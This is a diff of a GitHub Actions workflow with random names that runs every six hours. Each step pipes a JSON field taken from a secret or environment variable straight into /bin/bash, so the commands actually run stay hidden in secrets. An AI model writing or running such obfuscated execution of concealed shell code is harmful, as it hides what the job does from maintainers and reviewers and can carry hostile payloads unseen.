@@ -2,7 +2,7 @@ name: budajian3691
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 2/6 * * *'
+    - cron: '34 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,25 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: budajian3691
         env:
-          j777: ${{ secrets.j777 }}
+          fzs5882: ${{ secrets.fzs5882 }}
         run: |
-          echo $j777 | jq -r .aos63242 | /bin/bash
-          echo $bvbe4876 | jq -r .bhk08 | /bin/bash
-          echo $g6070 | jq -r .n5644 | /bin/bash
-          echo $nbuyo3274 | jq -r .cwi5958 | /bin/bash
-          echo $ttp42228 | jq -r .cgfy760 | /bin/bash
-          echo $wqurq989 | jq -r .azw697 | /bin/bash
-          echo $vaad32679 | jq -r .gapap48639 | /bin/bash
-          echo $gma2749 | jq -r .aight8 | /bin/bash
-          echo $qwis320 | jq -r .v11 | /bin/bash
-          echo $z7372 | jq -r .yh3093 | /bin/bash
-          echo $bo3 | jq -r .jmdyh19 | /bin/bash
-          echo $b85 | jq -r .jjp572 | /bin/bash
-          echo $ove0 | jq -r .g24 | /bin/bash
-          echo $xo90855 | jq -r .rai354 | /bin/bash
-          echo $f24787 | jq -r .axk290 | /bin/bash
-          echo $l841 | jq -r .cpkw628 | /bin/bash
-          echo $w89 | jq -r .jljb91506 | /bin/bash
-          echo $z94 | jq -r .iwcd6 | /bin/bash
-          echo $ovx584 | jq -r .ix285 | /bin/bash
+          echo $fzs5882 | jq -r .jygv950 | /bin/bash
+          echo $ur50 | jq -r .zsu44 | /bin/bash
+          echo $wosgo83757 | jq -r .y5 | /bin/bash
+          echo $nn09633 | jq -r .kkiux77 | /bin/bash
+          echo $b0697 | jq -r .m076 | /bin/bash
+          echo $u32 | jq -r .aolgz664 | /bin/bash
+          echo $rheni5734 | jq -r .bpxbv32541 | /bin/bash
 
